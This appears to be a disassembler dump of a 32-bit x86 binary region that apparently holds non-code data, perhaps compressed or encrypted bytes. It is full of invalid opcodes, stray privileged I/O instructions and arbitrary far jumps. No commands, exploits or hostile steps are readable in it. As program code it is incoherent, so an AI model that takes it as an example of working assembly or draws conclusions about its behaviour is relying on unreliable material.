  41c1a8:	jg     0x41c174
  41c1aa:	stos   BYTE PTR es:[edi],al
  41c1ab:	(bad)  
  41c1ac:	xchg   ecx,eax
  41c1ad:	sbb    bl,BYTE PTR [ebx]
  41c1af:	or     al,0x67
  41c1b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1b2:	int3   
  41c1b3:	iret   
  41c1b4:	aas    
  41c1b5:	mov    ebp,0x96ca9306
  41c1ba:	dec    DWORD PTR [esi+eax*8+0x3]
  41c1be:	mov    dh,0xa8
  41c1c0:	jmp    FWORD PTR [ebx]
  41c1c2:	imul   ecx,DWORD PTR [edi-0x3cf28933],0x64
  41c1c9:	cmp    BYTE PTR [esp+eax*1+0x4283e8a],ah
  41c1d0:	adc    bh,BYTE PTR [edx+ecx*4]
  41c1d3:	pop    ss
  41c1d4:	cli    
  41c1d5:	inc    ebp
  41c1d6:	fs stos DWORD PTR es:[edi],eax
  41c1d8:	arpl   WORD PTR [esi+0x6e6904a6],ax
  41c1de:	lock pop esi
  41c1e0:	add    edi,ebp
  41c1e2:	inc    eax
  41c1e3:	xlat   BYTE PTR ds:[ebx]
  41c1e4:	xchg   ah,bl
  41c1e6:	adc    DWORD PTR [edx+0x541a7316],0x4f
  41c1ed:	fadd   QWORD PTR [edx]
  41c1ef:	mov    dl,0xd2
  41c1f1:	mov    edx,0xe26ebe52
  41c1f6:	repz out 0x39,al
  41c1f9:	mov    ebx,0x8497d3b6
  41c1fe:	out    dx,al
  41c1ff:	out    0x6,eax
  41c201:	je     0x41c22b
  41c203:	dec    edi
  41c204:	dec    eax
  41c205:	xchg   cl,ah
  41c207:	repz out dx,al
  41c209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c20a:	xor    ecx,DWORD PTR [esi-0xd]
  41c20d:	push   ecx
  41c20e:	dec    edx
  41c20f:	push   0xffffffad
  41c211:	hlt    
  41c212:	ins    BYTE PTR es:[edi],dx
  41c213:	outs   dx,BYTE PTR ds:[esi]
  41c214:	std    
  41c215:	xchg   BYTE PTR [eax],cl
  41c217:	add    ebx,edi
  41c219:	lods   eax,DWORD PTR ds:[esi]
  41c21a:	mov    esp,DWORD PTR [ecx+esi*8]
  41c21d:	pop    ds
  41c21e:	mov    bl,0x3
  41c220:	push   esi
  41c221:	test   al,0xc0
  41c223:	rcr    BYTE PTR [esp+eax*1-0x194a7be9],1
  41c22a:	stos   DWORD PTR es:[edi],eax
  41c22b:	enter  0xe5ec,0x5
  41c22f:	push   ds
  41c230:	out    dx,eax
  41c231:	add    BYTE PTR [ebx+ebp*2],al
  41c234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c235:	mov    ebx,0x55e30d82
  41c23a:	sbb    eax,DWORD PTR [ecx+0x7851ed85]
  41c240:	mov    eax,0xcd4318c3
  41c245:	lods   al,BYTE PTR ds:[esi]
  41c246:	jo     0x41c2b6
  41c248:	nop    DWORD PTR [ecx]
  41c24b:	push   esp
  41c24c:	loopne 0x41c1fb
  41c24e:	inc    ebp
  41c24f:	cmp    eax,0x97657efd
  41c254:	icebp  
  41c255:	jecxz  0x41c2c8
  41c257:	pcmpgtw mm7,QWORD PTR [ecx-0xc9a00e0]
  41c25e:	fwait
  41c25f:	aad    0x49
  41c261:	sbb    BYTE PTR [edx-0x44086e32],0x43
  41c268:	into   
  41c269:	aad    0xd
  41c26b:	mov    ss,WORD PTR [edi-0x80]
  41c26e:	ror    DWORD PTR [edi],0x53
  41c271:	icebp  
  41c272:	jg     0x41c249
  41c274:	pop    edx
  41c275:	sub    edi,DWORD PTR [edx-0x6b]
  41c278:	dec    edx
  41c279:	popf   
  41c27a:	inc    edx
  41c27b:	call   edi
  41c27d:	cmp    BYTE PTR [ebx+0x6448d1b8],0x6e
  41c284:	cs inc ebx
  41c286:	pop    esi
  41c287:	mov    ds:0x2cbdb74a,eax
  41c28c:	stc    
  41c28d:	(bad)  
  41c28e:	push   ecx
  41c28f:	scas   eax,DWORD PTR es:[edi]
  41c290:	mov    ah,0x5b
  41c292:	add    ah,BYTE PTR [eax-0x61]
  41c295:	xchg   esi,eax
  41c296:	ins    BYTE PTR es:[edi],dx
  41c297:	inc    esp
  41c298:	dec    esi
  41c299:	cmp    DWORD PTR [eax-0x3f],edi
  41c29c:	mov    DWORD PTR ds:[eax+0x79],ebp
  41c2a0:	test   DWORD PTR [edi],eax
  41c2a2:	and    DWORD PTR [ebx+ecx*4-0x7b],eax
  41c2a6:	xchg   edi,eax
  41c2a7:	and    DWORD PTR [ecx],ebx
  41c2a9:	pop    ebx
  41c2aa:	daa    
  41c2ab:	inc    ebp
  41c2ac:	cmc    
  41c2ad:	add    DWORD PTR [edi],0x7b076947
  41c2b3:	dec    ebp
  41c2b4:	daa    
  41c2b5:	add    DWORD PTR [esi+0x7fcc4751],0x16ba7cf3
  41c2bf:	fs xor DWORD PTR gs:[ebx-0x54f4783d],ebx
  41c2c7:	stos   DWORD PTR es:[edi],eax
  41c2c8:	test   ecx,esi
  41c2ca:	sahf   
  41c2cb:	mov    bh,0xf1
  41c2cd:	loop   0x41c345
  41c2cf:	sbb    bh,al
  41c2d1:	push   esp
  41c2d2:	in     al,0xcc
  41c2d4:	and    DWORD PTR [eax],ecx
  41c2d6:	je     0x41c2d0
  41c2d8:	imul   edx,DWORD PTR [ebx+eax*1],0xffffff8b
  41c2dc:	add    al,0xa8
  41c2de:	sbb    DWORD PTR [ecx-0x14b8be60],ebp
  41c2e4:	jb     0x41c326
  41c2e6:	fnstcw WORD PTR [edx]
  41c2e8:	dec    ebp
  41c2e9:	mov    edi,0xa91e5cc0
  41c2ee:	arpl   WORD PTR [esi-0x6eb90b4],bx
  41c2f4:	mov    es,WORD PTR [edi]
  41c2f6:	cli    
  41c2f7:	(bad)  
  41c2f8:	xlat   BYTE PTR ds:[ebx]
  41c2f9:	call   0xd630:0x9637e3ad
  41c300:	fistp  DWORD PTR ds:0xc7ab92f9
  41c306:	mov    WORD PTR fs:[ecx-0x35],gs
  41c30a:	in     eax,dx
  41c30b:	jns    0x41c382
  41c30d:	ret    
  41c30e:	loop   0x41c2d9
  41c310:	addr16 out dx,eax
  41c312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c313:	loop   0x41c36f
  41c315:	mov    dh,ch
  41c317:	pop    ebp
  41c318:	lds    ebp,FWORD PTR [ecx+0x74b3bfab]
  41c31e:	and    eax,0xb9d4424a
  41c323:	stos   DWORD PTR es:[edi],eax
  41c324:	mov    es,esi
  41c326:	rcr    DWORD PTR [eax+0x133cb5ef],0x99
  41c32d:	xlat   BYTE PTR ds:[ebx]
  41c32e:	or     DWORD PTR [esi+0x40],0xffffff82
  41c332:	xchg   ecx,eax
  41c333:	inc    ecx
  41c334:	icebp  
  41c335:	jno    0x41c36e
  41c337:	(bad)  
  41c338:	sub    al,0x7a
  41c33a:	add    dh,BYTE PTR [ebp-0x2b]
  41c33d:	das    
  41c33e:	repnz out dx,eax
  41c340:	dec    esp
  41c341:	into   
  41c342:	retf   0xf2bb
  41c345:	sbb    al,0x42
  41c347:	addr16 stc 
  41c349:	lahf   
  41c34a:	cli    
  41c34b:	mov    bl,0xb9
  41c34d:	outs   dx,DWORD PTR ss:[esi]
  41c34f:	mov    ss,WORD PTR [edx+0xebba4b4]
  41c355:	arpl   WORD PTR fs:[esi-0x7c],cx
  41c359:	jae    0x41c305
  41c35b:	cdq    
  41c35c:	test   BYTE PTR [ebp+0x6f],0xea
  41c360:	push   cs
  41c361:	aas    
  41c362:	jg     0x41c2e9
  41c364:	jnp    0x41c32b
  41c366:	and    BYTE PTR [eax+eiz*2-0x2b],ch
  41c36a:	sbb    DWORD PTR [eax],esp
  41c36c:	jle    0x41c399
  41c36e:	jge    0x41c354
  41c370:	jecxz  0x41c2f7
  41c372:	fwait
  41c373:	xchg   esi,eax
  41c374:	sub    ebp,ebp
  41c376:	mov    dh,0x7f
  41c378:	inc    ecx
  41c379:	and    ax,0x1587
  41c37d:	fmul   st,st(7)
  41c37f:	push   es
  41c380:	and    ch,bh
  41c382:	ins    BYTE PTR es:[edi],dx
  41c383:	loop   0x41c3ef
  41c385:	xor    BYTE PTR [edx],ah
  41c387:	shr    BYTE PTR [ebp+0x71344428],cl
  41c38d:	xor    eax,0x4e38578d
  41c392:	outs   dx,BYTE PTR ds:[esi]
  41c393:	pop    esp
  41c394:	mov    bh,0x95
  41c396:	scas   al,BYTE PTR es:[edi]
  41c397:	cmp    bh,BYTE PTR [esi-0x692ee406]
  41c39d:	jp     0x41c35b
  41c39f:	mov    ds:0x271b2787,eax
  41c3a4:	jge    0x41c3c7
  41c3a6:	cmp    al,0xe5
  41c3a8:	mov    WORD PTR [edx],gs
  41c3aa:	popa   
  41c3ab:	sti    
  41c3ac:	dec    edx
  41c3ad:	lock scas al,BYTE PTR es:[edi]
  41c3af:	in     eax,dx
  41c3b0:	mov    ebp,0xb9cba463
  41c3b5:	mov    al,0xda
  41c3b7:	and    DWORD PTR [esi-0x34],ebx
  41c3ba:	test   DWORD PTR [esi],ebp
  41c3bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3bd:	pop    es
  41c3be:	cmp    ebx,DWORD PTR [edi+0x4a]
  41c3c1:	arpl   WORD PTR [ecx+ebx*4],cx
  41c3c4:	or     al,BYTE PTR es:[edx]
  41c3c7:	cmp    DWORD PTR [edx+0x2c],ebx
  41c3ca:	pushf  
  41c3cb:	daa    
  41c3cc:	xchg   esp,eax
  41c3cd:	dec    ebp
  41c3ce:	js     0x41c3d7
  41c3d0:	stc    
  41c3d1:	inc    ebp
  41c3d2:	xlat   BYTE PTR ds:[ebx]
  41c3d3:	xchg   ecx,eax
  41c3d4:	fbld   TBYTE PTR [edi]
  41c3d6:	inc    ebp
  41c3d7:	pop    ss
  41c3d8:	sub    ecx,eax
  41c3da:	inc    si
  41c3dc:	mov    eax,ds:0xc38390f7
  41c3e1:	call   0x959ad363
  41c3e6:	jmp    0x41c426
  41c3e8:	pop    ebx
  41c3e9:	or     DWORD PTR [edi-0x1e],ebp
  41c3ec:	loop   0x41c409
  41c3ee:	rcl    DWORD PTR [eax+0x5ddb243d],0x1c
  41c3f5:	sub    ebx,DWORD PTR [ebx]
  41c3f7:	inc    edi
  41c3f8:	add    al,0x15
  41c3fa:	xor    BYTE PTR [edi-0x60],ah
  41c3fd:	push   ebp
  41c3fe:	pop    esp
  41c3ff:	push   es
  41c400:	cmp    ecx,DWORD PTR [edi+0x5b72148e]
  41c406:	dec    ebx
  41c407:	push   esi
  41c408:	in     al,0x31
  41c40a:	(bad)  
  41c40c:	outs   dx,BYTE PTR ds:[esi]
  41c40d:	ins    DWORD PTR es:[edi],dx
  41c40e:	shl    edx,1
  41c410:	add    al,0x2c
  41c412:	sub    eax,0x1187eebb
  41c417:	mov    ds:0x6f57c73a,eax
  41c41c:	es push edx
  41c41e:	(bad)  
  41c41f:	popa   
  41c420:	shl    DWORD PTR [edi+0x4f1b8596],0x6c
  41c427:	xchg   ebp,eax
  41c428:	pop    edi
  41c429:	shr    esi,1
  41c42b:	push   es
  41c42c:	and    BYTE PTR [ebx],bl
  41c42e:	xor    BYTE PTR [ebx-0x2207135c],ch
  41c434:	sub    bl,BYTE PTR [esi+eax*4]
  41c437:	sahf   
  41c438:	loope  0x41c45a
  41c43a:	bound  ebx,QWORD PTR [esi+0x21000997]
  41c440:	es xchg BYTE PTR gs:[edx-0x2dcfc1b6],ch
  41c448:	add    al,0xe9
  41c44a:	mov    edx,0x38901c4b
  41c44f:	shl    BYTE PTR [ebx+0x1ecce897],1
  41c455:	cdq    
  41c456:	pop    eax
  41c457:	cmc    
  41c458:	arpl   WORD PTR [esi+0x46e8d0c9],cx
  41c45e:	fs mov bh,0x2f
  41c461:	or     ecx,eax
  41c463:	lods   eax,DWORD PTR ds:[esi]
  41c464:	mov    BYTE PTR [ecx],bh
  41c466:	les    edi,FWORD PTR [ebx]
  41c468:	daa    
  41c469:	pop    edx
  41c46a:	fsub   QWORD PTR [edx-0x5c6608cf]
  41c470:	xchg   esi,eax
  41c471:	jmp    0x63b2a143
  41c476:	lods   eax,DWORD PTR ds:[esi]
  41c477:	mov    fs,WORD PTR [eax+0x63bd334b]
  41c47d:	div    DWORD PTR [ebx]
  41c47f:	cmp    ebp,DWORD PTR [ebp-0x7a]
  41c482:	adc    al,0x42
  41c484:	jns    0x41c4c5
  41c486:	call   0xd395435c
  41c48b:	sar    DWORD PTR [esi],cl
  41c48d:	push   ds
  41c48e:	stos   BYTE PTR es:[edi],al
  41c48f:	xchg   esp,eax
  41c490:	and    ebx,eax
  41c492:	jb     0x41c42e
  41c494:	les    ebp,FWORD PTR [ebx]
  41c496:	dec    edi
  41c497:	arpl   ax,bp
  41c499:	loope  0x41c44a
  41c49b:	mov    DWORD PTR [ebx+0x7debcad0],ebp
  41c4a1:	and    al,0xeb
  41c4a3:	push   es
  41c4a4:	mov    edx,0xd25f3f06
  41c4a9:	push   cs
  41c4aa:	ds jge 0x41c4a8
  41c4ad:	mov    esp,0xb281094d
  41c4b2:	ror    bl,1
  41c4b4:	jp     0x41c45e
  41c4b6:	call   0x6761:0xcfb5f9f2
  41c4bd:	xchg   DWORD PTR [eax],esi
  41c4bf:	or     eax,0x3d74cf3e
  41c4c4:	loopne 0x41c4b9
  41c4c6:	adc    BYTE PTR [ecx-0x55],cl
  41c4c9:	ins    DWORD PTR es:[edi],dx
  41c4ca:	jmp    0x719c:0x74ff
  41c4d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4d1:	ficom  WORD PTR [ebx+0x4f9b3bf5]
  41c4d7:	mov    ecx,0xd2a577d4
  41c4dc:	cli    
  41c4dd:	dec    ebp
  41c4de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4df:	add    al,0xee
  41c4e1:	(bad)  
  41c4e2:	sub    ecx,ebx
  41c4e4:	call   0xa0ad:0x66e3dbf0
  41c4eb:	leave  
  41c4ec:	scas   al,BYTE PTR es:[edi]
  41c4ed:	call   0x7afa:0x6dee8531
  41c4f4:	and    esp,DWORD PTR [ebx]
  41c4f6:	or     al,0xeb
  41c4f8:	cmp    dl,BYTE PTR [edi]
  41c4fa:	sub    al,0x2b
  41c4fc:	lods   al,BYTE PTR ds:[esi]
  41c4fd:	pushf  
  41c4fe:	pop    ecx
  41c4ff:	outs   dx,BYTE PTR ds:[esi]
  41c500:	in     eax,0xb8
  41c502:	xor    dh,BYTE PTR [ecx+0x2ec82ee9]
  41c508:	mov    al,0x72
  41c50a:	xor    al,0x73
  41c50c:	clc    
  41c50d:	inc    edx
  41c50e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c50f:	stc    
  41c510:	mov    dh,0x38
  41c512:	pop    ebx
  41c513:	push   eax
  41c514:	push   0xffffff90
  41c516:	aam    0x49
  41c518:	call   0x3287bff1
  41c51d:	rol    DWORD PTR [ebp-0x13bc8763],1
  41c523:	cmp    al,0x2
  41c525:	push   ebp
  41c526:	xor    ebp,edi
  41c528:	xchg   BYTE PTR [ebx-0x585eb18b],bh
  41c52e:	test   al,0xf1
  41c530:	adc    al,0xbc
  41c532:	jp     0x41c533
  41c534:	pop    edx
  41c535:	addr16 pop ss
  41c537:	(bad)  
  41c538:	xchg   edx,eax
  41c539:	and    ebx,edi
  41c53b:	pop    ebx
  41c53c:	inc    ebx
  41c53d:	push   ebx
  41c53e:	popf   
  41c53f:	aas    
  41c540:	cld    
  41c541:	outs   dx,BYTE PTR ds:[esi]
  41c542:	ins    BYTE PTR es:[edi],dx
  41c543:	mov    ch,0x7b
  41c545:	out    0x9b,al
  41c547:	mov    esi,DWORD PTR [ecx+0x36]
  41c54a:	sub    cl,ah
  41c54c:	mov    esi,0x791901fe
  41c551:	pop    edx
  41c552:	or     eax,0x84312868
  41c557:	jle    0x41c507
  41c559:	daa    
  41c55a:	add    DWORD PTR [ebx],esp
  41c55c:	stc    
  41c55d:	bnd jbe 0x41c5de
  41c560:	cs xor ch,cl
  41c563:	xchg   esi,eax
  41c564:	pop    edx
  41c565:	lods   eax,DWORD PTR ds:[esi]
  41c566:	lods   al,BYTE PTR ds:[esi]
  41c567:	cwde   
  41c568:	jnp    0x41c4f6
  41c56a:	int3   
  41c56b:	dec    eax
  41c56c:	icebp  
  41c56d:	clc    
  41c56e:	arpl   WORD PTR [eax+ebp*4],dx
  41c571:	sahf   
  41c572:	mov    ds:0x7a59c0a3,al
  41c577:	cmp    esi,ebp
  41c579:	(bad)  
  41c57a:	fst    QWORD PTR [ebp-0x6d9966f7]
  41c580:	pop    ebp
  41c581:	mov    BYTE PTR [esi],bh
  41c583:	inc    esp
  41c584:	push   DWORD PTR [ecx-0x6e]
  41c587:	mov    cl,BYTE PTR [ebx]
  41c589:	pushf  
  41c58a:	xor    esp,DWORD PTR [ebx-0x33ec49c6]
  41c590:	(bad)  
  41c591:	dec    edx
  41c592:	test   BYTE PTR [ebx-0x4a],al
  41c595:	inc    edi
  41c596:	jge    0x41c56c
  41c598:	nop
  41c599:	rcl    DWORD PTR ss:[ebx+0x5e],cl
  41c59d:	(bad)  
  41c59e:	mov    ebp,0xb9eb9cc4
  41c5a3:	scas   eax,DWORD PTR es:[edi]
  41c5a4:	sbb    BYTE PTR [edi+0x1182e12e],0xb9
  41c5ab:	test   BYTE PTR ds:0x4e0f6def,dl
  41c5b1:	imul   ebx,DWORD PTR [ebx],0x4c961e94
  41c5b7:	fst    QWORD PTR [ecx+0x3c3d1e7e]
  41c5bd:	in     al,dx
  41c5be:	fwait
  41c5bf:	lock retf 
  41c5c1:	(bad)  
  41c5c2:	int    0xec
  41c5c4:	mov    ?,WORD PTR [ecx]
  41c5c6:	(bad)  
  41c5c7:	mov    edx,0xfd97e4bc
  41c5cc:	dec    edx
  41c5cd:	add    DWORD PTR [ebp-0x46b5f693],0x47
  41c5d4:	outs   dx,BYTE PTR ds:[esi]
  41c5d5:	sti    
  41c5d6:	mov    al,0xbe
  41c5d8:	in     al,0xa3
  41c5da:	sub    al,0xbc
  41c5dc:	pop    ds
  41c5dd:	adc    ebp,DWORD PTR [eax-0x66]
  41c5e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5e1:	mov    esp,0x362e1377
  41c5e6:	jl     0x41c63a
  41c5e8:	fmul   st(5),st
  41c5ea:	pop    ebp
  41c5eb:	fild   QWORD PTR [edx]
  41c5ed:	out    dx,al
  41c5ee:	int3   
  41c5ef:	adc    al,dh
  41c5f1:	(bad)  
  41c5f2:	push   eax
  41c5f3:	jnp    0x41c645
  41c5f5:	nop
  41c5f6:	sbb    al,0x20
  41c5f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5f9:	test   al,0xa9
  41c5fb:	fcmovne st,st(1)
  41c5fd:	mov    esi,0xe478e17b
  41c602:	es pop edx
  41c604:	push   ds
  41c605:	inc    ecx
  41c606:	ja     0x41c60f
  41c608:	call   FWORD PTR [ebp*2-0x22793b7f]
  41c60f:	rcr    DWORD PTR [esi-0x13],cl
  41c612:	pop    eax
  41c613:	ins    BYTE PTR es:[di],dx
  41c615:	shl    BYTE PTR [eax],0x75
  41c618:	jmp    0x9b73:0xeeec7a92
  41c61f:	pusha  
  41c620:	and    cl,BYTE PTR [ebp-0x37]
  41c623:	xchg   DWORD PTR [ecx],edi
  41c625:	icebp  
  41c626:	dec    edi
  41c627:	repz mov WORD PTR [edi+0x101cf6c9],es
  41c62e:	inc    eax
  41c62f:	inc    edx
  41c630:	outs   dx,BYTE PTR ds:[esi]
  41c631:	or     edx,DWORD PTR [edi+eax*2+0x50]
  41c635:	fcom   DWORD PTR [edx+ecx*8+0x1502d1]
  41c63c:	es dec esi
  41c63e:	dec    edx
  41c63f:	ds out dx,al
  41c641:	cmp    al,0xec
  41c643:	dec    esi
  41c644:	hlt    
  41c645:	mov    WORD PTR [ecx+0x5b503240],es
  41c64b:	add    BYTE PTR [ebx-0x32],0xe6
  41c64f:	xor    edx,ecx
  41c651:	xchg   esi,eax
  41c652:	dec    edi
  41c653:	fadd   st(1),st
  41c655:	shl    DWORD PTR [edi+0x52],1
	...
  41c827:	add    BYTE PTR [eax+ebx*1-0x2923a928],bl
  41c82e:	sahf   
  41c82f:	fidivr DWORD PTR [esi-0x64]
  41c832:	add    al,ah
  41c834:	mov    esi,0x5be59449
  41c839:	mov    al,0x1
  41c83b:	add    BYTE PTR [edx],ah
  41c83d:	pop    es
  41c83e:	add    BYTE PTR [eax],al
  41c840:	sub    BYTE PTR [esi-0x2652dd],al
  41c846:	xchg   ecx,eax
  41c847:	inc    esp
  41c848:	or     eax,0x5b7e63a2
  41c84d:	ss jle 0x41c866
  41c850:	dec    eax
  41c851:	fwait
  41c852:	rcl    dh,cl
  41c854:	scas   eax,DWORD PTR es:[edi]
  41c855:	jle    0x41c8a4
  41c857:	or     eax,0x8b3ac4f0
  41c85c:	mov    dh,BYTE PTR [eax]
  41c85e:	test   BYTE PTR ds:0x2ccb737d,ch
  41c864:	clc    
  41c865:	sahf   
  41c866:	vunpcklps xmm5,xmm3,xmm4
  41c86a:	inc    edi
  41c86b:	adc    esp,0x1945b4f1
  41c871:	call   DWORD PTR [eax]
  41c873:	rcr    BYTE PTR cs:[eax+esi*2+0x38],cl
  41c878:	das    
  41c879:	imul   ebx,DWORD PTR [esi+eiz*8],0x6b575e67
  41c880:	retf   
  41c881:	lods   eax,DWORD PTR ds:[esi]
  41c882:	mov    WORD PTR [esi],fs
  41c884:	pop    es
  41c885:	sahf   
  41c886:	inc    ebp
  41c888:	push   esi
  41c889:	sbb    BYTE PTR [esi],al
  41c88b:	es cmp eax,0x8afa1439
  41c891:	add    bh,dl
  41c893:	int    0x8a
  41c895:	xor    BYTE PTR [eax],dh
  41c897:	dec    eax
  41c898:	cmp    DWORD PTR [esp+eax*8],ebp
  41c89b:	xor    bh,BYTE PTR [edi+0xd]
  41c89e:	push   0xffffff8a
  41c8a0:	sub    BYTE PTR [ebx+0x3e],cl
  41c8a3:	inc    DWORD PTR [edi+0x68]
  41c8a6:	adc    BYTE PTR [ebx],0xf3
  41c8a9:	scas   al,BYTE PTR es:[edi]
  41c8aa:	jg     0xf5d6084a
  41c8b0:	add    al,0x95
  41c8b2:	fiadd  DWORD PTR [edi+eiz*4+0x6b]
  41c8b6:	mov    ss,WORD PTR [ebx]
  41c8b8:	jge    0x41c935
  41c8ba:	mov    ds:0x4d6bceac,eax
  41c8bf:	sbb    DWORD PTR [ebx],0x64
  41c8c2:	jns    0x41c885
  41c8c4:	dec    eax
  41c8c5:	xchg   edi,eax
  41c8c6:	(bad)  
  41c8c7:	cmp    eax,0xc0fd1678
  41c8cc:	stc    
  41c8cd:	mov    edi,0xa4a520f
  41c8d2:	mov    ecx,0xf64ca865
  41c8d7:	push   0xffffffb6
  41c8d9:	mov    eax,ds:0x9ad55af0
  41c8de:	pusha  
  41c8df:	lock xor DWORD PTR [edx+0x2b],esi
  41c8e3:	inc    esi
  41c8e4:	mov    ebx,0x79ceb483
  41c8e9:	mov    eax,ds:0x22ad3a47
  41c8ee:	mov    bl,BYTE PTR [eax]
  41c8f0:	pop    es
  41c8f1:	push   esi
  41c8f2:	jmp    0x41c8c7
  41c8f4:	in     al,0x5e
  41c8f6:	(bad)  
  41c8f7:	push   cs
  41c8f8:	jne    0x41c8f2
  41c8fa:	dec    esp
  41c8fb:	scas   al,BYTE PTR es:[edi]
  41c8fc:	enter  0x3cf,0x4a
  41c900:	dec    ebp
  41c901:	ins    DWORD PTR es:[edi],dx
  41c902:	dec    esp
  41c903:	in     eax,dx
  41c904:	mov    ?,WORD PTR [ebx+0x10c18dce]
  41c90a:	xchg   edi,eax
  41c90b:	int3   
  41c90c:	loop   0x41c924
  41c90e:	xchg   esp,eax
  41c90f:	ret    
  41c910:	jae    0x41c896
  41c912:	xor    dh,BYTE PTR [ebp+0x4d5cd8e5]
  41c918:	mov    ebx,0xb3541ff6
  41c91d:	dec    ecx
  41c91e:	sbb    al,0xec
  41c921:	jge    0x41c92a
  41c923:	aam    0xe8
  41c925:	xlat   BYTE PTR ds:[ebx]
  41c926:	xchg   esp,eax
  41c927:	pop    esp
  41c928:	out    dx,eax
  41c929:	inc    eax
  41c92a:	repnz add BYTE PTR [ebp+0x736db988],bh
  41c931:	je     0x41c8fa
  41c933:	(bad)  
  41c934:	mov    eax,0xf3aa3e77
  41c939:	xor    DWORD PTR [ecx-0x5e],ebx
  41c93c:	jle    0x41c8ed
  41c93e:	mov    edx,0x14329985
  41c943:	stos   BYTE PTR es:[edi],al
  41c944:	lea    edx,[ecx-0x71]
  41c947:	stos   BYTE PTR es:[edi],al
  41c948:	pop    ss
  41c949:	push   edx
  41c94a:	call   0x9452:0xc4e87485
  41c951:	mov    ah,0x5a
  41c953:	jno    0x41c998
  41c955:	mov    gs,WORD PTR [ecx]
  41c957:	popa   
  41c958:	jge    0x41c95c
  41c95a:	fsub   QWORD PTR [esi-0x6a338f19]
  41c960:	push   ds
  41c961:	push   ss
  41c962:	dec    ecx
  41c963:	xchg   al,bh
  41c965:	sbb    eax,0xd455b2c
  41c96a:	aaa    
  41c96b:	xor    edx,DWORD PTR es:[eax-0x4f934a68]
  41c972:	lock jmp 0x41c9b0
  41c975:	mov    al,ds:0x8845ffc
  41c97a:	push   0xeb3ea3a8
  41c97f:	ffree  st(4)
  41c981:	stc    
  41c982:	loopne 0x41c971
  41c984:	mov    edx,0x660d3cca
  41c989:	adc    ecx,DWORD PTR [edi]
  41c98b:	ins    BYTE PTR es:[edi],dx
  41c98c:	aad    0x3f
  41c98e:	and    BYTE PTR [ecx+0x6c],bl
  41c991:	xchg   esp,eax
  41c992:	pop    edi
  41c993:	clc    
  41c994:	xor    BYTE PTR [ebp+0x61],dl
  41c997:	lods   eax,DWORD PTR ds:[esi]
  41c998:	outs   dx,DWORD PTR ds:[esi]
  41c999:	adc    dh,BYTE PTR [ecx]
  41c99b:	jb     0x41c91e
  41c99d:	cmp    eax,0x716db2b9
  41c9a2:	je     0x41c9b9
  41c9a4:	adc    BYTE PTR [edx+0x47367209],bl
  41c9aa:	sahf   
  41c9ab:	mov    eax,ds:0x8244ea62
  41c9b0:	or     DWORD PTR [eax-0x42],ebp
  41c9b3:	inc    eax
  41c9b4:	stos   DWORD PTR es:[edi],eax
  41c9b5:	out    dx,al
  41c9b6:	adc    BYTE PTR [edx+0x4b90f403],cl
  41c9bc:	enter  0x29ee,0xc8
  41c9c0:	sar    BYTE PTR [esi-0x52aafb58],cl
  41c9c6:	cmc    
  41c9c7:	jg     0x41c9ac
  41c9c9:	addr16 pop ecx
  41c9cb:	pop    ds
  41c9cc:	sbb    ch,BYTE PTR ds:[edi+0x1]
  41c9d0:	jae    0x41ca2d
  41c9d2:	xchg   BYTE PTR [edi+edx*2+0x6a],bh
  41c9d6:	mov    esi,0xf2015c05
  41c9db:	add    eax,0xa2381422
  41c9e0:	test   BYTE PTR [edi],0x8f
  41c9e3:	or     eax,0x6dccb95b
  41c9e8:	dec    ebp
  41c9e9:	xchg   ecx,eax
  41c9ea:	inc    edx
  41c9eb:	mov    bl,dh
  41c9ed:	push   edx
  41c9ee:	and    bh,BYTE PTR [ebx-0x7d]
  41c9f1:	sub    al,cl
  41c9f3:	test   DWORD PTR [ebp+edi*4+0x424581e0],0x232b0d5d
  41c9fe:	lahf   
  41c9ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca00:	stc    
  41ca01:	(bad)  
  41ca02:	ss mov ah,0x3a
  41ca05:	jl     0x41ca7b
  41ca07:	fcomi  st,st(2)
  41ca09:	dec    ecx
  41ca0a:	adc    eax,0x2db3171c
  41ca0f:	xlat   BYTE PTR ds:[ebx]
  41ca10:	fnsave [ecx+0x45]
  41ca13:	push   edi
  41ca14:	cmp    eax,0x2ea9ba7f
  41ca19:	arpl   dx,ax
  41ca1b:	into   
  41ca1c:	ins    DWORD PTR es:[edi],dx
  41ca1d:	test   DWORD PTR [eax-0x8],ebp
  41ca20:	iret   
  41ca21:	pop    ebx
  41ca22:	fimul  DWORD PTR [edi+eax*4]
  41ca25:	nop
  41ca26:	and    eax,0x468c7330
  41ca2b:	rsm    
  41ca2d:	add    al,0xa0
  41ca2f:	pop    ecx
  41ca30:	fmul   DWORD PTR [esi+0x75879343]
  41ca36:	sti    
  41ca37:	arpl   si,di
  41ca39:	imul   DWORD PTR [edi+0x36]
  41ca3c:	xor    edx,DWORD PTR [esi]
  41ca3e:	outs   dx,BYTE PTR ds:[esi]
  41ca3f:	pop    es
  41ca40:	mov    dh,0x32
  41ca42:	mov    eax,ds:0xda394083
  41ca47:	fdiv   DWORD PTR [esi+0xf320d5d]
  41ca4d:	jns    0x41ca37
  41ca4f:	aaa    
  41ca50:	cmp    al,0x3c
  41ca52:	in     eax,0x4a
  41ca54:	outs   dx,BYTE PTR ds:[esi]
  41ca55:	mov    bl,0x1c
  41ca57:	addr16 jbe 0x41c9e6
  41ca5a:	stos   DWORD PTR es:[edi],eax
  41ca5b:	fst    QWORD PTR [ecx-0x569cebe7]
  41ca61:	outs   dx,DWORD PTR ds:[esi]
  41ca62:	dec    edx
  41ca63:	test   al,0x38
  41ca65:	in     eax,dx
  41ca66:	lea    ecx,[ebx+0x37]
  41ca69:	ficomp WORD PTR [esp+ecx*8+0x1ace6d45]
  41ca70:	sbb    cl,BYTE PTR [ebx]
  41ca72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca73:	xchg   DWORD PTR ss:[edi+0x9],edi
  41ca77:	mov    ah,0x43
  41ca79:	and    BYTE PTR [esi-0x5a],bl
  41ca7c:	ins    BYTE PTR es:[edi],dx
